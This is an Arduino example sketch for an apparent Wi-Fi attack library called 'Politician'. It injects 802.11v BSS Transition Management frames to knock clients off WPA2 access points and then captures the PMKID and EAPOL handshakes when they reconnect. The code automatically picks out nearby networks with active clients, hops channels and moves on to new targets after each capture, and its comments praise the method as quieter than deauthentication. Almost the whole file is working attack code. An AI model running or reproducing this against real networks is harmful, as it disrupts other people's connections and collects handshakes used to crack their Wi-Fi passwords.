/*
 * BtmSteering.ino
 *
 * Demonstrates 802.11v BSS Transition Management (BTM) Request injection
 * using the Politician library.
 *
 * BTM is a polite 802.11v frame that asks a client to roam to a different AP.
 * Many modern clients (iOS, Android, Windows 11, macOS) honour BTM requests
 * and disconnect voluntarily — triggering a fresh 4-way handshake on reconnect
 * without sending a noisy Deauth or CSA beacon.
 *
 * This example:
 *   1. Enables ATTACK_BTM alongside ATTACK_PMKID.
 *   2. Sets a targeting policy that focuses on WPA2 APs with active clients.
 *   3. Uses AttackResultCallback to log outcomes.
 *
 * BTM fires per connected STA immediately after an AP is selected as target.
 * Combine with ATTACK_PMKID so that after the client roams, the PMKID fishing
 * attempt is ready to capture the resulting EAPOL handshake.
 *
 * Config knobs:
 *   cfg.btm_burst_count     — how many BTM frames to send per client (default 3)
 *   cfg.btm_disassoc_timer  — Disassociation Timer field in TBTT units (default 10)
 */

#include <Arduino.h>
#include <Politician.h>

using namespace politician;

Politician engine;

// ─── Attack Result Callback ───────────────────────────────────────────────────

void onAttackResult(const AttackResultRecord &r) {
    const char *ssid = r.ssid_len > 0 ? r.ssid : "(hidden)";
    switch (r.result) {
        case RESULT_PMKID_EXHAUSTED:
            Serial.printf("[-] PMKID exhausted for \"%s\"\n", ssid);
            break;
        case RESULT_CSA_EXPIRED:
            Serial.printf("[-] CSA wait expired for \"%s\"\n", ssid);
            break;
        default:
            break;
    }
}

// ─── Handshake Callback ───────────────────────────────────────────────────────

void onHandshake(const HandshakeRecord &rec) {
    Serial.printf("\n[!] %s captured from \"%s\" (vendor: %s)\n",
        rec.type == CAP_PMKID ? "PMKID" : "EAPOL",
        rec.ssid,
        Politician::getVendor(rec.bssid));
}

// ─── Targeting Filter ─────────────────────────────────────────────────────────
// Only attack WPA2 APs that have at least one connected client visible.
// BTM requires a known STA MAC — if no STA is seen, no BTM is sent anyway.

bool targetFilter(const ApRecord &ap) {
    if (ap.enc < 3)         return false; // Skip open/WEP
    if (ap.rssi < -75)      return false; // Too far
    if (ap.sta_count == 0)  return false; // No clients visible
    return true;
}

// ─── Setup ───────────────────────────────────────────────────────────────────

void setup() {
    Serial.begin(115200);
    delay(2000);
    Serial.println("\n--- Politician: BTM Steering + PMKID Capture Example ---");
    Serial.println("Using 802.11v BTM to trigger client reconnections...\n");

    Config cfg;
    cfg.smart_hopping      = true;
    cfg.btm_burst_count    = 3;    // Send 3 BTM frames per client
    cfg.btm_disassoc_timer = 10;   // 10 TBTTs (~102ms) before disassoc

    if (engine.begin(cfg) != politician::OK) {
        Serial.println("[ERROR] WiFi init failed!");
        while (1) delay(100);
    }

    engine.setEapolCallback(onHandshake);
    engine.setAttackResultCallback(onAttackResult);
    engine.setTargetFilter(targetFilter);

    // ATTACK_BTM: send polite BTM request to known clients
    // ATTACK_PMKID: immediately start PMKID fishing when client reconnects
    // ATTACK_PASSIVE: also capture natural reconnects on adjacent channels
    engine.setAttackMask(ATTACK_BTM | ATTACK_PMKID | ATTACK_PASSIVE);

    engine.setAutoTarget(true);    // Automatically move to next AP after capture
    engine.setDisconnectionStrategy(STRATEGY_AUTO_FALLBACK);
    engine.startHopping();

    Serial.println("Engine started. Hunting for BTM-responsive clients...");
}

// ─── Loop ────────────────────────────────────────────────────────────────────

void loop() {
    engine.tick();
}
